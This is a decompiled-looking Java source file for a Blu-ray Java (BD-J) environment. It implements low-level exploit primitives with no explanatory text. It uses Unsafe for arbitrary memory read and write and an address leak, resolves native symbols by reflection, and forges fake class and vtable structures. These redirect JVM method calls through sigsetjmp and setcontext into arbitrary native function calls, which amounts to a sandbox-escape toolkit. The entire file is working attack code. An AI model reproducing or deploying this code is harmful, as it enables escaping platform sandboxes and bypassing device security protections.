package org.bdj.api;

import java.io.ByteArrayOutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;

















public final class API
{
  public static final int RTLD_DEFAULT = -2;
  public static final int LIBC_MODULE_HANDLE = 2;
  public static final int LIBKERNEL_MODULE_HANDLE = 8193;
  public static final int LIBJAVA_MODULE_HANDLE = 74;
  private static final String UNSUPPORTED_DLOPEN_OPERATION_STRING = "Unsupported dlopen() operation";
  private static final String JAVA_JAVA_LANG_REFLECT_ARRAY_MULTI_NEW_ARRAY_SYMBOL = "Java_java_lang_reflect_Array_multiNewArray";
  private static final String JVM_NATIVE_PATH_SYMBOL = "JVM_NativePath";
  private static final String SIGSETJMP_SYMBOL = "sigsetjmp";
  private static final String UX86_64_SETCONTEXT_SYMBOL = "__Ux86_64_setcontext";
  private static final String ERROR_SYMBOL = "__error";
  private static final String MULTI_NEW_ARRAY_METHOD_NAME = "multiNewArray";
  private static final String MULTI_NEW_ARRAY_METHOD_SIGNATURE = "(J[I)J";
  private static final String NATIVE_LIBRARY_CLASS_NAME = "java.lang.ClassLoader$NativeLibrary";
  private static final String FIND_METHOD_NAME = "find";
  private static final String FIND_ENTRY_METHOD_NAME = "findEntry";
  private static final String HANDLE_FIELD_NAME = "handle";
  private static final String VALUE_FIELD_NAME = "value";
  private static final int[] MULTI_NEW_ARRAY_DIMENSIONS = new int[] { 1 };
  
  private static final int ARRAY_BASE_OFFSET = 24;
  
  private static final ThreadLocal callContexts = new ThreadLocal();
  
  private static API instance;
  
  private UnsafeInterface unsafe;
  
  private Object nativeLibrary;
  
  private Method findMethod;
  
  private Field handleField;
  
  private long executableHandle;
  private long Java_java_lang_reflect_Array_multiNewArray;
  private long JVM_NativePath;
  private long sigsetjmp;
  private long __Ux86_64_setcontext;
  private long __error;
  private boolean jdk11;
  
  private API() throws Exception {
    init();
  }
  
  public static synchronized API getInstance() throws Exception {
    if (instance == null) {
      instance = new API();
    }
    return instance;
  }


  
  public boolean isJdk11() {
    return this.jdk11;
  }
  
  private void init() throws Exception {
    initUnsafe();
    initDlsym();
    initSymbols();
    initApiCall();
  }
  
  private void initUnsafe() throws Exception {
    this.unsafe = new UnsafeSunImpl();
    this.jdk11 = false;
  }
  
  private void initDlsym() throws Exception {
    Class clazz = Class.forName("java.lang.ClassLoader$NativeLibrary");
    
    if (this.jdk11) {
      this
        .findMethod = clazz.getDeclaredMethod("findEntry", new Class[] { String.class });
    } else {
      this
        .findMethod = clazz.getDeclaredMethod("find", new Class[] { String.class });
    } 
    
    this.handleField = clazz.getDeclaredField("handle");
    
    this.findMethod.setAccessible(true);
    this.handleField.setAccessible(true);

    
    Constructor constructor = clazz.getDeclaredConstructor(new Class[] {
          Class.class, String.class, boolean.class });
    constructor.setAccessible(true);
    
    this
      .nativeLibrary = constructor.newInstance(new Object[] { getClass(), "api", new Boolean(true) });
  }
  
  private void initSymbols() {
    this.JVM_NativePath = dlsym(-2L, "JVM_NativePath");
    if (this.JVM_NativePath == 0L) {
      throw new InternalError("JVM_NativePath not found");
    }
    
    this.__Ux86_64_setcontext = dlsym(8193L, "__Ux86_64_setcontext");
    if (this.__Ux86_64_setcontext == 0L) {
      
      this.executableHandle = this.JVM_NativePath & 0xFFFFFFFFFFFFFFFCL;
      while (strcmp(this.executableHandle, "Unsupported dlopen() operation") != 0) {
        this.executableHandle += 4L;
      }
      this.executableHandle -= 4L;

      
      this.__Ux86_64_setcontext = dlsym(8193L, "__Ux86_64_setcontext");
    } 
    if (this.__Ux86_64_setcontext == 0L) {
      throw new InternalError("__Ux86_64_setcontext not found");
    }
    
    if (this.jdk11) {
      this
        .Java_java_lang_reflect_Array_multiNewArray = dlsym(74L, "Java_java_lang_reflect_Array_multiNewArray");
    } else {
      this
        .Java_java_lang_reflect_Array_multiNewArray = dlsym(-2L, "Java_java_lang_reflect_Array_multiNewArray");
    } 
    if (this.Java_java_lang_reflect_Array_multiNewArray == 0L) {
      throw new InternalError("Java_java_lang_reflect_Array_multiNewArray not found");
    }
    
    this.sigsetjmp = dlsym(8193L, "sigsetjmp");
    if (this.sigsetjmp == 0L) {
      throw new InternalError("sigsetjmp not found");
    }
    
    this.__error = dlsym(8193L, "__error");
    if (this.__error == 0L) {
      throw new InternalError("__error not found");
    }
  }
  
  private void initApiCall() {
    long l1 = addrof(this);
    long l2 = read64(l1 + 8L);
    
    boolean bool = false;
    if (this.jdk11) {
      long l = read64(l2 + 368L);
      int i = read32(l + 0L);
      
      for (byte b = 0; b < i; b++) {
        long l3 = read64(l + 8L + (b * 8));
        long l4 = read64(l3 + 8L);
        long l5 = read64(l4 + 8L);
        short s1 = read16(l4 + 42L);
        short s2 = read16(l4 + 44L);
        long l6 = read64(l5 + 64L + (s1 * 8)) & 0xFFFFFFFFFFFFFFFEL;
        long l7 = read64(l5 + 64L + (s2 * 8)) & 0xFFFFFFFFFFFFFFFEL;
        short s3 = read16(l6 + 0L);
        short s4 = read16(l7 + 0L);
        
        String str1 = readString(l6 + 6L, s3);
        String str2 = readString(l7 + 6L, s4);
        if (str1.equals("multiNewArray") && str2
          .equals("(J[I)J")) {
          write64(l3 + 80L, this.Java_java_lang_reflect_Array_multiNewArray);
          bool = true;
          break;
        } 
      } 
    } else {
      long l = read64(l2 + 200L);
      int i = read32(l + 16L);
      
      for (byte b = 0; b < i; b++) {
        long l3 = read64(l + 24L + (b * 8));
        long l4 = read64(l3 + 16L);
        long l5 = read64(l3 + 24L);
        short s1 = read16(l4 + 66L);
        short s2 = read16(l4 + 68L);
        long l6 = read64(l5 + 64L + (s1 * 8)) & 0xFFFFFFFFFFFFFFFEL;
        long l7 = read64(l5 + 64L + (s2 * 8)) & 0xFFFFFFFFFFFFFFFEL;
        short s3 = read16(l6 + 8L);
        short s4 = read16(l7 + 8L);
        
        String str1 = readString(l6 + 10L, s3);
        String str2 = readString(l7 + 10L, s4);
        if (str1.equals("multiNewArray") && str2
          .equals("(J[I)J")) {
          write64(l3 + 120L, this.Java_java_lang_reflect_Array_multiNewArray);
          bool = true;
          
          break;
        } 
      } 
    } 
    if (!bool) {
      throw new InternalError("installing native method failed");
    }

    
    train();
  }
  
  private void train() {
    for (byte b = 0; b < '✐'; b++) {
      call(0L);
    }
  }










  
  private void buildContext(long[] paramArrayOflong1, long[] paramArrayOflong2, int paramInt, long paramLong1, long paramLong2, long paramLong3, long paramLong4, long paramLong5, long paramLong6, long paramLong7) {
    long l1 = paramArrayOflong2[(paramInt + 8) / 8];
    long l2 = paramArrayOflong2[(paramInt + 16) / 8];
    long l3 = paramArrayOflong2[(paramInt + 24) / 8];
    long l4 = paramArrayOflong2[(paramInt + 32) / 8];
    long l5 = paramArrayOflong2[(paramInt + 40) / 8];
    long l6 = paramArrayOflong2[(paramInt + 48) / 8];
    long l7 = paramArrayOflong2[(paramInt + 56) / 8];
    
    paramArrayOflong1[(paramInt + 72) / 8] = paramLong2;
    paramArrayOflong1[(paramInt + 80) / 8] = paramLong3;
    paramArrayOflong1[(paramInt + 88) / 8] = paramLong4;
    paramArrayOflong1[(paramInt + 96) / 8] = paramLong5;
    paramArrayOflong1[(paramInt + 104) / 8] = paramLong6;
    paramArrayOflong1[(paramInt + 112) / 8] = paramLong7;
    paramArrayOflong1[(paramInt + 128) / 8] = l1;
    paramArrayOflong1[(paramInt + 136) / 8] = l3;
    paramArrayOflong1[(paramInt + 160) / 8] = l4;
    paramArrayOflong1[(paramInt + 168) / 8] = l5;
    paramArrayOflong1[(paramInt + 176) / 8] = l6;
    paramArrayOflong1[(paramInt + 184) / 8] = l7;
    paramArrayOflong1[(paramInt + 224) / 8] = paramLong1;
    paramArrayOflong1[(paramInt + 248) / 8] = l2;
  }
  
  public long call(long paramLong1, long paramLong2, long paramLong3, long paramLong4, long paramLong5, long paramLong6, long paramLong7) {
    long l = 0L;




    
    byte b = (paramLong1 == 0L) ? 1 : 2;
    
    CallContext callContext = getCallContext();
    
    if (this.jdk11) {
      callContext.fakeKlass[24] = 0L;
      
      for (byte b1 = 0; b1 < b; b1++) {
        callContext.fakeKlass[0] = callContext.fakeKlassVtableAddr;
        callContext.fakeKlass[0] = callContext.fakeKlassVtableAddr;
        if (b1 == 0) {
          callContext.fakeKlassVtable[43] = this.sigsetjmp + 35L;
        } else {
          callContext.fakeKlassVtable[43] = this.__Ux86_64_setcontext + 57L;
        } 
        
        l = multiNewArray(callContext.fakeClassOopAddr, MULTI_NEW_ARRAY_DIMENSIONS);
        
        if (b1 == 0) {
          buildContext(callContext.fakeKlass, callContext.fakeKlass, 0, paramLong1, paramLong2, paramLong3, paramLong4, paramLong5, paramLong6, paramLong7);

        
        }

      
      }


    
    }
    else {

      
      callContext.fakeKlass[23] = 0L;
      
      for (byte b1 = 0; b1 < b; b1++) {
        callContext.fakeKlass[2] = callContext.fakeKlassVtableAddr;
        callContext.fakeKlass[4] = callContext.fakeKlassVtableAddr;
        if (b1 == 0) {
          callContext.fakeKlassVtable[70] = this.sigsetjmp + 35L;
        } else {
          callContext.fakeKlassVtable[70] = this.__Ux86_64_setcontext + 57L;
        } 
        
        l = multiNewArray(callContext.fakeClassOopAddr, MULTI_NEW_ARRAY_DIMENSIONS);
        
        if (b1 == 0) {
          buildContext(callContext.fakeKlass, callContext.fakeKlass, 32, paramLong1, paramLong2, paramLong3, paramLong4, paramLong5, paramLong6, paramLong7);
        }
      } 
    } 










    
    if (l == 0L) {
      return 0L;
    }
    
    return read64(l);
  }
  
  public long call(long paramLong1, long paramLong2, long paramLong3, long paramLong4, long paramLong5, long paramLong6) {
    return call(paramLong1, paramLong2, paramLong3, paramLong4, paramLong5, paramLong6, 0L);
  }
  
  public long call(long paramLong1, long paramLong2, long paramLong3, long paramLong4, long paramLong5) {
    return call(paramLong1, paramLong2, paramLong3, paramLong4, paramLong5, 0L, 0L);
  }
  
  public long call(long paramLong1, long paramLong2, long paramLong3, long paramLong4) {
    return call(paramLong1, paramLong2, paramLong3, paramLong4, 0L, 0L, 0L);
  }
  
  public long call(long paramLong1, long paramLong2, long paramLong3) {
    return call(paramLong1, paramLong2, paramLong3, 0L, 0L, 0L, 0L);
  }
  
  public long call(long paramLong1, long paramLong2) {
    return call(paramLong1, paramLong2, 0L, 0L, 0L, 0L, 0L);
  }
  
  public long call(long paramLong) {
    return call(paramLong, 0L, 0L, 0L, 0L, 0L, 0L);
  }
  
  public int errno() {
    return read32(call(this.__error));
  }
  
  public long dlsym(long paramLong, String paramString) {
    int i = -2;
    try {
      if (this.executableHandle != 0L) {
        
        i = read32(this.executableHandle);
        write32(this.executableHandle, (int)paramLong);
        this.handleField.setLong(this.nativeLibrary, -2L);
      } else {
        this.handleField.setLong(this.nativeLibrary, paramLong);
      } 
      return ((Long)this.findMethod.invoke(this.nativeLibrary, new Object[] { paramString })).longValue();
    } catch (IllegalAccessException illegalAccessException) {
      return 0L;
    } catch (InvocationTargetException invocationTargetException) {
      return 0L;
    } finally {
      if (this.executableHandle != 0L) {
        write32(this.executableHandle, i);
      }
    } 
  }
  
  public long addrof(Object paramObject) {
    Object[] arrayOfObject = { paramObject };
    return this.unsafe.getLong(arrayOfObject, 24L);
  }
  
  public byte read8(long paramLong) {
    return this.unsafe.getByte(paramLong);
  }
  
  public short read16(long paramLong) {
    return this.unsafe.getShort(paramLong);
  }
  
  public int read32(long paramLong) {
    return this.unsafe.getInt(paramLong);
  }
  
  public long read64(long paramLong) {
    return this.unsafe.getLong(paramLong);
  }
  
  public void write8(long paramLong, byte paramByte) {
    this.unsafe.putByte(paramLong, paramByte);
  }
  
  public void write16(long paramLong, short paramShort) {
    this.unsafe.putShort(paramLong, paramShort);
  }
  
  public void write32(long paramLong, int paramInt) {
    this.unsafe.putInt(paramLong, paramInt);
  }
  
  public void write64(long paramLong1, long paramLong2) {
    this.unsafe.putLong(paramLong1, paramLong2);
  }
  
  public long malloc(long paramLong) {
    return this.unsafe.allocateMemory(paramLong);
  }
  
  public long calloc(long paramLong1, long paramLong2) {
    long l = malloc(paramLong1 * paramLong2);
    if (l != 0L) {
      memset(l, 0, paramLong1 * paramLong2);
    }
    return l;
  }
  
  public long realloc(long paramLong1, long paramLong2) {
    return this.unsafe.reallocateMemory(paramLong1, paramLong2);
  }
  
  public void free(long paramLong) {
    this.unsafe.freeMemory(paramLong);
  }
  
  public long memcpy(long paramLong1, long paramLong2, long paramLong3) {
    this.unsafe.copyMemory(paramLong2, paramLong1, paramLong3);
    return paramLong1;
  }
  
  public long memcpy(long paramLong1, byte[] paramArrayOfbyte, long paramLong2) {
    for (byte b = 0; b < paramLong2; b++) {
      write8(paramLong1 + b, paramArrayOfbyte[b]);
    }
    return paramLong1;
  }
  
  public byte[] memcpy(byte[] paramArrayOfbyte, long paramLong1, long paramLong2) {
    for (byte b = 0; b < paramLong2; b++) {
      paramArrayOfbyte[b] = read8(paramLong1 + b);
    }
    return paramArrayOfbyte;
  }
  
  public long memset(long paramLong1, int paramInt, long paramLong2) {
    this.unsafe.setMemory(paramLong1, paramLong2, (byte)paramInt);
    return paramLong1;
  }
  
  public byte[] memset(byte[] paramArrayOfbyte, int paramInt, long paramLong) {
    for (byte b = 0; b < paramLong; b++) {
      paramArrayOfbyte[b] = (byte)paramInt;
    }
    return paramArrayOfbyte;
  }
  
  public int memcmp(long paramLong1, long paramLong2, long paramLong3) {
    for (byte b = 0; b < paramLong3; b++) {
      byte b1 = read8(paramLong1 + b);
      byte b2 = read8(paramLong2 + b);
      if (b1 != b2) {
        return b1 - b2;
      }
    } 
    return 0;
  }
  
  public int memcmp(long paramLong1, byte[] paramArrayOfbyte, long paramLong2) {
    for (byte b = 0; b < paramLong2; b++) {
      byte b1 = read8(paramLong1 + b);
      byte b2 = paramArrayOfbyte[b];
      if (b1 != b2) {
        return b1 - b2;
      }
    } 
    return 0;
  }
  
  public int memcmp(byte[] paramArrayOfbyte, long paramLong1, long paramLong2) {
    return memcmp(paramLong1, paramArrayOfbyte, paramLong2);
  }
  
  public int strcmp(long paramLong1, long paramLong2) {
    for (byte b = 0;; b++) {
      byte b1 = read8(paramLong1 + b);
      byte b2 = read8(paramLong2 + b);
      if (b1 != b2) {
        return b1 - b2;
      }
      if (b1 == 0 && b2 == 0) {
        return 0;
      }
    } 
  }
  
  public int strcmp(long paramLong, String paramString) {
    byte[] arrayOfByte = toCBytes(paramString);
    for (byte b = 0;; b++) {
      byte b1 = read8(paramLong + b);
      byte b2 = arrayOfByte[b];
      if (b1 != b2) {
        return b1 - b2;
      }
      if (b1 == 0 && b2 == 0) {
        return 0;
      }
    } 
  }
  
  public int strcmp(String paramString, long paramLong) {
    return strcmp(paramLong, paramString);
  }
  
  public long strcpy(long paramLong1, long paramLong2) {
    for (byte b = 0;; b++) {
      byte b1 = read8(paramLong2 + b);
      write8(paramLong1 + b, b1);
      if (b1 == 0) {
        break;
      }
    } 
    return paramLong1;
  }
  
  public long strcpy(long paramLong, String paramString) {
    byte[] arrayOfByte = toCBytes(paramString);
    for (byte b = 0;; b++) {
      byte b1 = arrayOfByte[b];
      write8(paramLong + b, b1);
      if (b1 == 0) {
        break;
      }
    } 
    return paramLong;
  }
  
  public String readString(long paramLong1, long paramLong2) {
    ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
    for (byte b = 0;; b++) {
      byte b1 = read8(paramLong1 + b);
      if (b1 == 0 || b == paramLong2) {
        break;
      }
      byteArrayOutputStream.write(new byte[] { b1 }, 0, 1);
    } 
    return byteArrayOutputStream.toString();
  }
  
  public String readString(long paramLong) {
    return readString(paramLong, -1L);
  }
  
  public byte[] toCBytes(String paramString) {
    byte[] arrayOfByte = new byte[paramString.length() + 1];
    System.arraycopy(paramString.getBytes(), 0, arrayOfByte, 0, paramString.length());
    return arrayOfByte;
  }
  
  private CallContext getCallContext() {
    CallContext callContext = callContexts.get();
    if (callContext != null) {
      return callContext;
    }
    
    callContext = new CallContext(this);
    callContexts.set(callContext);
    return callContext;
  }

  
  private native long multiNewArray(long paramLong, int[] paramArrayOfint);

  
  class CallContext
  {
    final long[] fakeClassOop;
    final long[] fakeClass;
    final long[] fakeKlass;
    final long[] fakeKlassVtable;
    final long fakeClassOopAddr;
    
    CallContext(API this$0) {
      this.this$0 = this$0;
      this
        .callContextBuffer = this$0.malloc(1896L);







      
      if (this.callContextBuffer == 0L) {
        throw new OutOfMemoryError("malloc failed");
      }

      
      this.fakeClassOopAddr = this.callContextBuffer + 24L;
      this.fakeClassAddr = this.fakeClassOopAddr + 8L + 24L;
      this.fakeKlassAddr = this.fakeClassAddr + 256L + 24L;
      this.fakeKlassVtableAddr = this.fakeKlassAddr + 512L + 24L;
      
      long[] arrayOfLong = new long[1];
      long l1 = this$0.addrof(arrayOfLong);
      long l2 = this$0.read64(l1 + 8L);

      
      this$0.write64(this.fakeClassOopAddr - 24L, 1L);
      this$0.write64(this.fakeClassAddr - 24L, 1L);
      this$0.write64(this.fakeKlassAddr - 24L, 1L);
      this$0.write64(this.fakeKlassVtableAddr - 24L, 1L);
      
      this$0.write64(this.fakeClassOopAddr - 16L, l2);
      this$0.write64(this.fakeClassAddr - 16L, l2);
      this$0.write64(this.fakeKlassAddr - 16L, l2);
      this$0.write64(this.fakeKlassVtableAddr - 16L, l2);
      
      this$0.write64(this.fakeClassOopAddr - 8L, -1L);
      this$0.write64(this.fakeClassAddr - 8L, -1L);
      this$0.write64(this.fakeKlassAddr - 8L, -1L);
      this$0.write64(this.fakeKlassVtableAddr - 8L, -1L);
      
      long[][] arrayOfLong1 = new long[4][0];
      long l3 = this$0.addrof(arrayOfLong1) + 24L;

      
      this$0.write64(l3 + 0L, this.fakeClassOopAddr - 24L);
      this$0.write64(l3 + 8L, this.fakeClassAddr - 24L);
      this$0.write64(l3 + 16L, this.fakeKlassAddr - 24L);
      this$0.write64(l3 + 24L, this.fakeKlassVtableAddr - 24L);

      
      this.fakeClassOop = arrayOfLong1[0];
      this.fakeClass = arrayOfLong1[1];
      this.fakeKlass = arrayOfLong1[2];
      this.fakeKlassVtable = arrayOfLong1[3];

      
      this$0.write64(l3 + 0L, 0L);
      this$0.write64(l3 + 8L, 0L);
      this$0.write64(l3 + 16L, 0L);
      this$0.write64(l3 + 24L, 0L);
      
      if (this$0.jdk11) {
        this.fakeClassOop[0] = this.fakeClassAddr;
        this.fakeClass[19] = this.fakeKlassAddr;
        this.fakeKlassVtable[27] = this$0.JVM_NativePath;
      } else {
        this.fakeClassOop[0] = this.fakeClassAddr;
        this.fakeClass[13] = this.fakeKlassAddr;
        this.fakeKlassVtable[16] = this$0.JVM_NativePath;
        this.fakeKlassVtable[30] = this$0.JVM_NativePath;
      } 
    }
    final long fakeClassAddr; final long fakeKlassAddr; final long fakeKlassVtableAddr; private final long callContextBuffer; private final API this$0;
    protected void finalize() {
      this.this$0.free(this.callContextBuffer);
    }
  }
}
